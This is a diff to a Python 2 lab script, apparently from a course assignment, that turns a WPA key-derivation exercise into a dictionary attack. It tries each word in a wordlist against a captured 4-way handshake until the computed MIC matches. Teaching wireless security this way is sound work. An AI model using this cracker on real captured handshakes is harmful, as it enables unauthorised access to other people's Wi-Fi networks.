@@ -39,7 +39,7 @@ def customPRF512(key,A,B):
 wpa=rdpcap("wpa_handshake.cap") 
 
 # Important parameters for key derivation - some of them can be obtained from the pcap file
-passPhrase  = "actuelle" #this is the passphrase of the WPA network
+passPhrase  = "" #this is the passphrase of the WPA network
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function and should never be modified
 
 ssid        = wpa[0].info
@@ -62,25 +62,39 @@ B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(A
 #print(wpa[8].load.encode("hex"))
 # Take a good look at the contents of this variable. Compare it to the Wireshark last message of the 4-way handshake.
 # In particular, look at the last 16 bytes. Read "Important info" in the lab assignment for explanation
-data = format(ea.version, "#02").decode("hex")+format(ea.type, "#02").decode("hex")+ hex(ea.len)[2:].zfill(4).decode("hex") + wpa[8].load[:-36]
+data = format(ea.version, "#02").decode("hex")+format(ea.type, "#02").decode("hex")+ hex(ea.len)[2:].zfill(4).decode("hex") + wpa[8].load[:-36] + '\x00'*36
+
+print(data.encode("hex"))
+with open('test.txt') as topo_file:
+    for line in topo_file:
+	
+	line = line[:-1]
+	print line + '\n'
+	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+	pmk = pbkdf2_hex(line, ssid, 4096, 32)
+
+	#expand pmk to obtain PTK
+	ptk = customPRF512(a2b_hex(pmk),A,B)
+
+	#calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
+	mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+	mic = mic.hexdigest()[0:32]
+	print mic
+	print mic_to_test
+	if mic == mic_to_test:
+		print "The password is " + line
+		break
+
+
 
 print "\n\nValues used to derivate keys"
 print "============================"
-print "Passphrase: ",passPhrase,"\n"
 print "SSID: ",ssid,"\n"
 print "AP Mac: ",b2a_hex(APmac),"\n"
 print "CLient Mac: ",b2a_hex(Clientmac),"\n"
 print "AP Nonce: ",b2a_hex(ANonce),"\n"
 print "Client Nonce: ",b2a_hex(SNonce),"\n"
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
-
-#expand pmk to obtain PTK
-ptk = customPRF512(a2b_hex(pmk),A,B)
-
-#calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
 #separate ptk into different keys - represent in hex
 KCK = b2a_hex(ptk[0:16])
